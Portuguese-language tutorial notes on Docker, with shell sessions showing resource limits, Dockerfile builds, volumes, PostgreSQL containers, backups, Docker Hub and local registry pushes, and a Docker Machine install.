root@osboxes:~# docker container top 7f824cb8005e Claro, se o mesmo estiver instalado no container
Para criar um container do nginx por exemplo com limitação de memória e cpu, eu posso definir isso na criação. Exemplo:
root@osboxes:~# docker container run -d -m 128M --cpus 0.5 nginx Neste caso estou definindo 128MB de ram para o container e que ele se limite a usar só 50% de CPU.
Posso testar utilizando o stress.
Agora quero mudar quero que utilize 80% de CPU, então eu posso fazer um update.
root@osboxes:~# docker container update --cpus 0.8 --memory 64M 7f824cb8005e Agora ele vai utilizar 80% de CPU e 64MB de memória, para o ID que no caso é do nginx.
Criando um Dockerfile Depois de criar uma pasta para alocar o Dockerfile, eu crio um arquivo no vim
FROM debian LABEL app=&amp;#34;BIKER&amp;#34; ENV FXSHELL=&amp;#34;Devops&amp;#34; RUN apt-get update &amp;amp;&amp;amp; apt-get install -y stress &amp;amp;&amp;amp; apt-get clean CMD stress --cpu 1 --vm-bytes 64M --vm 1 Depois de criado, vou buildar
$ docker image build -t toskeira:1.0 root@osboxes:~/tosko_dockerfile# docker image build -t toskeira:1.0 . Sending build context to Docker daemon 2.048kB Step 1/5 : FROM debian latest: Pulling from library/debian 57df1a1f1ad8: Pull complete Digest: sha256:439a6bae1ef351ba9308fc9a5e69ff7754c14516f6be8ca26975fb564cb7fb76 Status: Downloaded newer image for debian:latest ---&amp;gt; f6dcff9b59af Step 2/5 : LABEL app=&amp;#34;moranguinho&amp;#34; ---&amp;gt; Running in c329bf2c69e1 Removing intermediate container c329bf2c69e1 ---&amp;gt; d59dacfad6f9 Step 3/5 : ENV FELIPE=&amp;#34;Lindo&amp;#34; ---&amp;gt; Running in 8c2387746f05 Removing intermediate container 8c2387746f05 ---&amp;gt; 36c9c0b6beb9 Step 4/5 : RUN apt-get update &amp;amp;&amp;amp; apt-get install -y stress &amp;amp;&amp;amp; apt-get clean ---&amp;gt; Running in f4b8d2261527 Get:1 http://security.debian.org/debian-security buster/updates InRelease [65.4 kB] Get:2 http://deb.debian.org/debian buster InRelease [121 kB] Get:3 http://deb.debian.org/debian buster-updates InRelease [51.9 kB] Get:4 http://deb.debian.org/debian buster/main amd64 Packages [7906 kB] Get:5 http://security.debian.org/debian-security buster/updates/main amd64 Packages [233 kB] Get:6 http://deb.debian.org/debian buster-updates/main amd64 Packages [7868 B] Fetched 8387 kB in 11s (794 kB/s) Reading package lists... Reading package lists... Building dependency tree... Reading state information... The following NEW packages will be installed: stress 0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded. Need to get 21.8 kB of archives. After this operation, 55.3 kB of additional disk space will be used. Get:1 http://deb.debian.org/debian buster/main amd64 stress amd64 1.0.4-4 [21.8 kB] debconf: delaying package configuration, since apt-utils is not installed Fetched 21.8 kB in 8s (2708 B/s) Selecting previously unselected package stress. (Reading database ... 6677 files and directories currently installed.) Preparing to unpack .../stress_1.0.4-4_amd64.deb ... Unpacking stress (1.0.4-4) ... Setting up stress (1.0.4-4) ... Removing intermediate container f4b8d2261527 ---&amp;gt; 3662327fda9e Step 5/5 : CMD stress --cpu 1 --vm-bytes 64M --vm 1 ---&amp;gt; Running in 83774952c3c4 Removing intermediate container 83774952c3c4 ---&amp;gt; d24fe1c0773b Successfully built d24fe1c0773b Successfully tagged toskeira:1.0 root@osboxes:~/tosko_dockerfile# Certo, agora se eu der um comando, docker image ls ele vai exibir a nossa imagem recem criada.
root@osboxes:~/tosko_dockerfile# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE toskeira 1.0 d24fe1c0773b About a minute ago 133MB Para executar
docker container run -d toskeira:1.0 Limitando memoria
docker container run -d --memory 64M toskeira:1.0 Posso também utilizar o comando update.
root@osboxes:~# docker container update --cpus 0.8 --memory 64M [CONTAINER ID] Limitando CPU para 80% e memoria para 64M
#Entendendo volumes
Volumes nada mais sao do que diretorios externos ao container, que são montados diretamente nele, dessa forma bypassam seu filesystem, ou seja, não seguem aquele padrão de camadas.
A principal função do volume é persistir os dados. Diferentemente do filesystem do container, que é volátil e toda informação escrita nele é perdida quando o container morre, quando você escreve em um volume aquele dado continua lá. independentemente do estado do container.
=&amp;gt; É iniciado quando o container é criado
=&amp;gt; Caso ocorra de já haver dados no diretório em que você está montando como volume, ou seja, se o diretório já existe e já está populado na imagem base, aqueles dados serão copiados para o volume.
=&amp;gt; Um volume pode ser reusado e compartilhado entre os containers.
=&amp;gt; Alterações em um volume são feitas diretamente do volume.
=&amp;gt; Alterações em um volume não irão com a imagem quando você fizer uma cópia ou snapshot de um container.
=&amp;gt; Volumes continuam a existir mesmo se você deletar o container.
#Exemplo
Criamos uma pasta para montar nosso volume no local:
root@FXSHELL ~# mkdir /opt/moranguinho Volumes do tipo bind é quando eu já tenho um diretório que quero montar especifico.
root@FXSHELL ~# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho debian Beleza, já dentro do container crio um arquivo de teste dentro do volume.
root@07b30662ffc0:/# cd moranguinho/ root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# touch teste root@07b30662ffc0:/moranguinho# exit exit root@FXSHELL ~# cd /opt/moranguinho/ root@FXSHELL /o/moranguinho# ls teste root@FXSHELL /o/moranguinho# Agora se eu executar um outro container, posso notar que o volume continua o mesmo e com o arquivo criado no passo anterior lá dentro.
root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho debian root@c72d32bd0846:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@c72d32bd0846:/# cd moranguinho/ root@c72d32bd0846:/moranguinho# ls teste root@c72d32bd0846:/moranguinho# root@9911369c74af:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 217G 8.8G 197G 5% / tmpfs 64M 0 64M 0% /dev tmpfs 491M 0 491M 0% /sys/fs/cgroup shm 64M 0 64M 0% /dev/shm /dev/sda1 217G 8.8G 197G 5% /moranguinho tmpfs 491M 0 491M 0% /proc/asound tmpfs 491M 0 491M 0% /proc/acpi tmpfs 491M 0 491M 0% /proc/scsi tmpfs 491M 0 491M 0% /sys/firmware root@9911369c74af:/# Este é o volume do tipo bind
OBS: também posso definir o volume somente como leitura definindo o parametro ro.
root@FXSHELL ~# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho,ro debian root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho,ro debian root@e779e386475a:/# cd moranguinho/ root@e779e386475a:/moranguinho# ls teste teste2 root@e779e386475a:/moranguinho# touch teste3 touch: cannot touch &amp;#39;teste3&amp;#39;: Read-only file system root@e779e386475a:/moranguinho# Mostrando a mensagem como read-only.
#Docker volume
Posso checar todos os volumes criados com o comando:
root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME root@FXSHELL ~# docker volume create moranguinho moranguinho root@FXSHELL ~# ls snap/ tosko_dockerfile/ root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume inspect moranguinho [ { &amp;#34;CreatedAt&amp;#34;: &amp;#34;2021-01-19T20:55:40-05:00&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Labels&amp;#34;: {}, &amp;#34;Mountpoint&amp;#34;: &amp;#34;/var/lib/docker/volumes/moranguinho/_data&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;moranguinho&amp;#34;, &amp;#34;Options&amp;#34;: {}, &amp;#34;Scope&amp;#34;: &amp;#34;local&amp;#34; } ] root@FXSHELL ~# Tudo e qualquer volume no docker, vai estar dentro de &amp;ldquo;/var/lib/docker/volumes&amp;rdquo;
root@FXSHELL ~# cd /var/lib/docker/volumes/ root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# Posso colocar meus arquivos dentro da pasta _&amp;quot;data&amp;quot; que fica dentro da pasta do volume
root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# cd moranguinho/_data/ root@FXSHELL /v/l/d/v/g/_data# touch teste1 teste2 teste3 root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 root@FXSHELL /v/l/d/v/g/_data# Posso montar esse volume também em um container, passando o tipo que agora não será tipo bind, mas sim volume
root@FXSHELL ~# docker container run -ti --mount type=volume,src=moranguinho,dst=/moranguinho debian root@4df1fe08b1da:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@4df1fe08b1da:/# cd moranguinho/ root@4df1fe08b1da:/moranguinho# ls teste1 teste2 teste3 root@4df1fe08b1da:/moranguinho# touch teste4_final Depois mato o container e vejo na pasta do volume, e eis o arquivo teste4_final está lá dentro.
root@FXSHELL ~# cd /var/lib/docker/volumes/ root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# cd moranguinho/_data/ root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# root@FXSHELL /v/l/d/v/g/_data# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4983b4a108a3 debian &amp;#34;bash&amp;#34; 11 seconds ago Up 10 seconds frosty_bartik root@FXSHELL /v/l/d/v/g/_data# docker container run -ti --mount type=volume,src=moranguinho,dst=/moranguinho debian root@13aacd8dfd58:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@13aacd8dfd58:/# cd moranguinho/ root@13aacd8dfd58:/moranguinho# ls teste1 teste2 teste3 teste4_final root@13aacd8dfd58:/moranguinho# ⏎ root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 13aacd8dfd58 debian &amp;#34;bash&amp;#34; 14 seconds ago Up 12 seconds flamboyant_moore 4983b4a108a3 debian &amp;#34;bash&amp;#34; About a minute ago Up About a minute frosty_bartik root@FXSHELL /v/l/d/v/g/_data# docker container exec -ti 13aacd8dfd58 touch /moranguinho/13aacd8dfd58 root@FXSHELL /v/l/d/v/g/_data# docker container exec -ti 4983b4a108a3 touch /moranguinho/4983b4a108a3 root@FXSHELL /v/l/d/v/g/_data# ls 13aacd8dfd58 4983b4a108a3 teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# Para remover o volume basta remover todos os containers que estiverem em uso com ele.
root@FXSHELL /v/l/d/v/g/_data [1]# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4df1fe08b1da debian &amp;#34;bash&amp;#34; 9 minutes ago Exited (0) 7 minutes ago zealous_tereshkova e779e386475a debian &amp;#34;bash&amp;#34; 21 minutes ago Exited (1) 20 minutes ago brave_meitner root@FXSHELL /v/l/d/v/g/_data# docker container rm -f 4df1fe08b1da 4df1fe08b1da root@FXSHELL /v/l/d/v/g/_data# docker container rm -f e779e386475a e779e386475a root@FXSHELL /v/l/d/v/g/_data# docker volume rm moranguinho moranguinho root@FXSHELL /v/l/d/v/g/_data# ls E assim dentro da pasta /var/lib não temos mais nada do volume moranguinho.
Posso ver as propriedades do volume criado com o comando:
root@FXSHELL /v/l/d/v/g/_data# docker container run -ti --mount type=volume,src=bolacha,dst=/bolacha debian root@FXSHELL /v/l/d/v/g/_data [1]# docker container inspect 9d5997be4321 &amp;#34;Mounts&amp;#34;: [ { &amp;#34;Type&amp;#34;: &amp;#34;volume&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;bolacha&amp;#34;, &amp;#34;Source&amp;#34;: &amp;#34;/var/lib/docker/volumes/bolacha/_data&amp;#34;, &amp;#34;Destination&amp;#34;: &amp;#34;/bolacha&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Mode&amp;#34;: &amp;#34;z&amp;#34;, &amp;#34;RW&amp;#34;: true, &amp;#34;Propagation&amp;#34;: &amp;#34;&amp;#34; } Se dou um ls volume, o bolacha ainda estará lá.
root@FXSHELL /v/l/d/v/g/_data# docker volume ls DRIVER VOLUME NAME local bolacha Posso utilizar o comando docker volume prune, para remover todos os volumes que estejam não estejam sendo utilizados.
root@FXSHELL ~# docker volume prune WARNING! This will remove all local volumes not used by at least one container. Are you sure you want to continue? [y/N] y Deleted Volumes: bolacha Total reclaimed space: 0B Posso fazer a mesma coisa para os containers que não estou utilizando mais.
root@FXSHELL ~# docker container prune WARNING! This will remove all stopped containers. Are you sure you want to continue? [y/N] y Deleted Containers: 9911369c74af20bcbf144e1487c326d3d06dd23a0293d7b561e54049f5ddbc56 c72d32bd0846e51a0cbd495909440ee14b64b474611b356704ee3170bf1931b7 07b30662ffc0b0068862768cd6d7c92eafc372d71f5dffc17baca8079cfadf59 ebb965d5043752debf60498d0eac5620ffaecc079af3b557c145539d3d721508 493a598735c5cb1ec6f658df0a4ad5b157562cb462789d19521f1d1fcccbc5fc acda8e5ec1adaaf1f2632be1fa8c2d6aedf9744be643991fea48d0d310fc3150 d7a861d6ea3811ed0273ac32ada6744a26ec85e14ff3b6c6ff5e3462004c3216 bcee760fd5702bb215b99da66109a3a59158aa5a47aae437d7ff4b516f93c38c 3d7c4a379d3e3d6a6710d581034d6199002942990f7d34ae5cb97617dd98ef32 2c6bcccf8f1727817a5da2c9b59edb7afdbb0790e3b3ba16a6298448d3cbb5a6 d21df8a6681620d956610f5e6808b21a0cd960d3c5a5c88da767b39efec4b674 ea431a856eff6fd17ff13d87ae498bfe91fb61fe6566744a528f62c1731689b5 8f88a55195f7defa35196f1d506a1d179af0099afbfcb34a9fd7fefef78240b6 40ab9db51e4a8c6e5603bdb51c60f37925e89d60afab8bda1ddf06071cb06ecc Total reclaimed space: 870.3MB root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@FXSHELL ~# Assim limpando tudo.
Agora um outro teste
root@FXSHELL ~# docker container create -v /opt/bolacha:/data --name dbdados centos 49eeb1ffb2453b206028478bc24f13582f5c1cb2ed2dbb378702ea10a7c5fb0c Com isso, apenas criamos o container e especificamos um volume para ele, mas ainda não o iniciamos.
Sabemos que no container o volume se encontra montado em &amp;ldquo;/data&amp;rdquo;.
Agora vamos criar os containers que rodarão o Postgresql utilizando o volume &amp;ldquo;/data&amp;rdquo; do container &amp;ldquo;dbdados&amp;rdquo; para guardar os dados.
Para isso precisamos entender dois parâmetros importantes:
&amp;ndash;volume-from : É utilizado quando queremos montar um volme disponibilizado por outro container.
-e : É utilizado para informar váriaveis de um ambiente para o container. No exemplo, estamos passando as variáveis de ambiente do PostgreSQL.
root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql Criei duas.
root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 79e408793331 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 8 seconds ago Up 7 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 2c2161d46619 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 6 minutes ago Up 6 minutes 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 49eeb1ffb245 centos &amp;#34;/bin/bash&amp;#34; 10 minutes ago Created dbdados root@FXSHELL ~# Fazendo da forma nova e atualizada:
root@FXSHELL ~# docker volume create dbdados dbdados root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 1fbdf3f70d206cebb44049c737e2d08359118df654bcf9481a5a46c99ab47ccc root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 368bc32d8ca3203dd8962ced0a6a4b999f56751462f121d3100c00169e43e4a8 root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 368bc32d8ca3 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 5 seconds ago Up 3 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 1fbdf3f70d20 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 16 seconds ago Up 14 seconds 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local dbdados root@FXSHELL ~# E assim os dados do postgreSQL estão la dentro:
root@FXSHELL ~# cd /var/lib/docker/volumes/dbdados/_data root@FXSHELL /v/l/d/v/d/_data# ls base/ pg_multixact/ pg_stat_tmp/ pg_xlog/ server.key@ global/ pg_notify/ pg_subtrans/ postgresql.conf pg_clog/ pg_serial/ pg_tblspc/ postmaster.opts pg_hba.conf pg_snapshots/ pg_twophase/ postmaster.pid pg_ident.conf pg_stat/ PG_VERSION server.crt@ root@FXSHELL /v/l/d/v/d/_data# Supondo que quero fazer um backup deste cara, e encarrego outro container de fazer isso, posso fazer algo assim:
root@FXSHELL ~# mkdir /opt/backup root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# docker container run -ti --mount type=volume,src=dbdados,dst=/data --mount type=bind,src=/opt/backup,dst=/backup debian tar -cvf /backup/bkp-banco.tar /data montando um volume do tipo bind dentro deste novo container e empacotando com o tar, o bkp.
#EXEMPLO DE COMANDOS
# docker container run -ti --mount type=bind,src=/volume,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=/root/primeiro_container,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=/root/primeiro_container,dst=/volume,ro ubuntu # docker volume create moranguinho # docker volume rm moranguinho # docker volume inspect moranguinho # docker volume prune # docker container run -d --mount type=volume,source=moranguinho,destination=/var/opa nginx # docker container create -v /data --name dbdados centos # docker run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -ti --volumes-from dbdados -v $(pwd):/backup debian tar -cvf /backup/backup.tar /data #Criando um dockerfile
$ vim dockerfiles/1/Dockerfile
FROM debian #qual imagem vou me basear RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean #executa oque vai fazer ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; #Variavel de ambiente para não ter dois apache rodando ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; #Variavel de ambiente de identificação do processo ENV APACHE_RUN_USER=&amp;#34;www.data&amp;#34; #Variavel de ambiente usuário responsável pelo apache ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; #Variavel de ambiente grupo responsável pelo apache ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; #onde vai salvar os logs do apache LABEL description=&amp;#34;Webserver&amp;#34; #faz uma descrição (qualquer chave=valor) LABEL version=&amp;#34;1.0.0&amp;#34; VOLUME /var/www/html #docker vai criar automaticamente esse volume EXPOSE 80 #com a flag -P irá pegar o expose qualquer porta = 80 Para criar o container eu faço um docker build.
root@FXSHELL ~# docker build . ou root@FXSHELL ~# docker image build -t meu_apache:1.0 . #Exemplos de Dockerfiles
FROM debian RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; ENV APACHE_RUN_USER=&amp;#34;www-data&amp;#34; ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; LABEL description=&amp;#34;Webserver&amp;#34; VOLUME /var/www/html/ EXPOSE 80 FROM debian RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2/apache2.pid&amp;#34; ENV APACHE_RUN_USER=&amp;#34;www-data&amp;#34; ENV APACHE_RUN_DIR=&amp;#34;/var/run/apache2&amp;#34; ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; LABEL description=&amp;#34;Webserver&amp;#34; VOLUME /var/www/html/ EXPOSE 80 ENTRYPOINT [&amp;#34;/usr/sbin/apachectl&amp;#34;] CMD [&amp;#34;-D&amp;#34;, &amp;#34;FOREGROUND&amp;#34;] package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;GIROPOPS STRIGUS GIRUS - LINUXTIPS&amp;#34;) } FROM golang WORKDIR /app ADD . /app RUN go build -o goapp ENTRYPOINT ./goapp FROM golang AS buildando ADD . /src WORKDIR /src RUN go build -o goapp FROM alpine:3.1 WORKDIR /app COPY --from=buildando /src/goapp /app ENTRYPOINT ./goapp ADD =&amp;gt; Copia novos arquivos, diretórios, arquivos TAR ou arquivos remotos e os adicionam ao filesystem do container;
CMD =&amp;gt; Executa um comando, diferente do RUN que executa o comando no momento em que está &amp;ldquo;buildando&amp;rdquo; a imagem, o CMD executa no início da execução do container;
LABEL =&amp;gt; Adiciona metadados a imagem como versão, descrição e fabricante;
COPY =&amp;gt; Copia novos arquivos e diretórios e os adicionam ao filesystem do container;
ENTRYPOINT =&amp;gt; Permite você configurar um container para rodar um executável, e quando esse executável for finalizado, o container também será;
ENV =&amp;gt; Informa variáveis de ambiente ao container;
EXPOSE =&amp;gt; Informa qual porta o container estará ouvindo;
FROM =&amp;gt; Indica qual imagem será utilizada como base, ela precisa ser a primeira linha do Dockerfile;
MAINTAINER =&amp;gt; Autor da imagem;
RUN =&amp;gt; Executa qualquer comando em uma nova camada no topo da imagem e &amp;ldquo;commita&amp;rdquo; as alterações. Essas alterações você poderá utilizar nas próximas instruções de seu Dockerfile;
USER =&amp;gt; Determina qual o usuário será utilizado na imagem. Por default é o root;
VOLUME =&amp;gt; Permite a criação de um ponto de montagem no container;
WORKDIR =&amp;gt; Responsável por mudar do diretório / (raiz) para o especificado nele;
  Um Dockerfile serve para criar uma imagem de um container
A finalidade da instrução FROM no Dockerfile é para indicar uma imagem base
Para &amp;ldquo;buildar&amp;rdquo; uma nova imagem, utilizo o comando, &amp;lsquo;docker build -t nomedaimagem:1.0 .&amp;rsquo;
As instruções para que o Dockerfile adicione um arquivo, são &amp;lsquo;ADD&amp;rsquo; ou &amp;lsquo;COPY&amp;rsquo;
No momento de criação da imagem o Dockerfile executa o comando &amp;lsquo;RUN&amp;rsquo;
Os comandos que executam um comando na inicialização do container são &amp;lsquo;ENTRYPOINT&amp;rsquo; ou &amp;lsquo;CMD&amp;rsquo;
A instrução que indica qual usuário que será utilizado no container é o &amp;lsquo;USER&amp;rsquo;
Indica que determinado diretório no container será um volume com o comando &amp;lsquo;VOLUME&amp;rsquo;
É possível ter duas instruções FROM dentro do mesmo Dockerfile.
Para referenciá-lo em outra parte do arquivo utilizo o &amp;lsquo;FROM debian AS giropops&amp;rsquo;
Para listar todas as imagens do container eu faço &amp;lsquo;docker image ls&amp;rsquo;
É possível criar uma imagem a partir de um container em execução.
Com o comando &amp;ldquo;docker commit&amp;rdquo; eu crio uma imagem apartir de um container em execução.
  **
#SUBINDO UMA IMAGEM PARA SUA CONTA DO DOCKERHUB
root@FXSHELL ~/d/2# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 6 minutes ago 267MB ubuntu latest f63181f19b2f 12 days ago 72.9MB root@FXSHELL ~/d/2# docker login Authenticating with existing credentials... WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded root@FXSHELL ~/d/2# docker push fpmatta/toddy:1.0 The push refers to repository [docker.io/fpmatta/toddy] b43d9cffa997: Pushing [==============================================&amp;gt; ] 178.2MB/193.7MB 02473afd360b: Mounted from library/ubuntu dbf2c0f42a39: Preparing 9f32931c9d28: Preparing #Não confio na internet; posso criar o meu registry local
Subindo o registry local:
root@FXSHELL ~# docker container run -d -p 5000:5000 --restart=always --name registry registry:2 Consigo ver o container do registry rodando bem como sua imagem.
root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 49fbebd0365b registry:2 &amp;#34;/entrypoint.sh /etc…&amp;#34; 34 seconds ago Up 32 seconds 0.0.0.0:5000-&amp;gt;5000/tcp registry root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 31 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# Preciso retagear o nome da minha imagem, passando o meu registry local que no caso é o &amp;lsquo;localhost:5000&amp;rsquo;
root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 31 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# docker tag e1c0c1113bca localhost:5000/fpmatta/toddy:1.0 root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 35 minutes ago 267MB localhost:5000/fpmatta/toddy 1.0 e1c0c1113bca 35 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# docker image push localhost:5000/fpmatta/toddy:1.0 The push refers to repository [localhost:5000/fpmatta/toddy] b43d9cffa997: Pushing [==================================================&amp;gt;] 199.9MB 02473afd360b: Pushed dbf2c0f42a39: Pushed 9f32931c9d28: Pushed Para checar sua imagem dentro do registry fica no caminho abaixo:
/var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a3c92b51fe5b localhost:5000/fpmatta/toddy:1.0 &amp;#34;/bin/bash&amp;#34; 13 minutes ago Up 13 minutes exciting_heyrovsky 49fbebd0365b registry:2 &amp;#34;/entrypoint.sh /etc…&amp;#34; 30 minutes ago Up 30 minutes 0.0.0.0:5000-&amp;gt;5000/tcp registry root@FXSHELL ~# docker exec -ti 49fbebd0365b sh / # ls bin entrypoint.sh home media opt root sbin sys usr dev etc lib mnt proc run srv tmp var / # cd /var/ cache/ empty/ lib/ local/ lock/ log/ mail/ opt/ run/ spool/ tmp/ / # cd /var/lib/ apk/ misc/ registry/ udhcpd/ / # cd /var/lib/registry/docker/registry/v2/ /var/lib/registry/docker/registry/v2 # ls blobs repositories /var/lib/registry/docker/registry/v2 # cd repositories/ /var/lib/registry/docker/registry/v2/repositories # ls fpmatta /var/lib/registry/docker/registry/v2/repositories # cd fpmatta/ /var/lib/registry/docker/registry/v2/repositories/fpmatta # ls toddy /var/lib/registry/docker/registry/v2/repositories/fpmatta # cd toddy/ /var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy # ls _layers _manifests _uploads /var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy #  #DockerHub e Registry - Exemplo comandos docker image inspect debian
docker history linuxtips/apache:1.0
docker login
docker login registry.suaempresa.com
docker push linuxtips/apache:1.0
docker pull linuxtips/apache:1.0
docker image ls
docker container run -d -p 5000:5000 &amp;ndash;restart=always &amp;ndash;name registry registry:2
docker tag IMAGEMID localhost:5000/apache
Docker Machine Para fazer a instalação do Docker Machine no Linux, faça:
# curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-`uname -s`-`uname -m` &amp;gt;/tmp/docker-machine # chmod &#43;x /tmp/docker-machine  # sudo cp /tmp/docker-machine /usr/local/bin/docker-machine Para seguir com a instalação no macOS: # curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-`uname -s`-`uname -m` &amp;gt;/usr/local/bin/docker-machine # chmod &#43;x /usr/local/bin/docker-machine Para seguir com a instalação no Windows caso esteja usando o Git bash: # if [[ ! -d &amp;#34;$HOME/bin&amp;#34; ]]; then mkdir -p &amp;#34;$HOME/bin&amp;#34;; fi # curl -L https://github.com/docker/machine/releases/download/v0.16.1 /docker-machine-Windows-x86_64.exe &amp;gt; &amp;#34;$HOME/bin/docker-machine.exe&amp;#34; # chmod &#43;x &amp;#34;$HOME/bin/docker-machine.exe&amp;#34; Para verificar se ele foi instalado e qual a sua versão, faça: # docker-machine version # docker-machine create --driver virtualbox linuxtips # docker-machine ls # docker-machine env linuxtips # eval &amp;#34;$(docker-machine env linuxtips)&amp;#34; # docker container ls # docker container run busybox echo &amp;#34;LINUXTIPS, VAIIII&amp;#34; # docker-machine ip linuxtips # docker-machine ssh linuxtips # docker-machine inspect linuxtips # 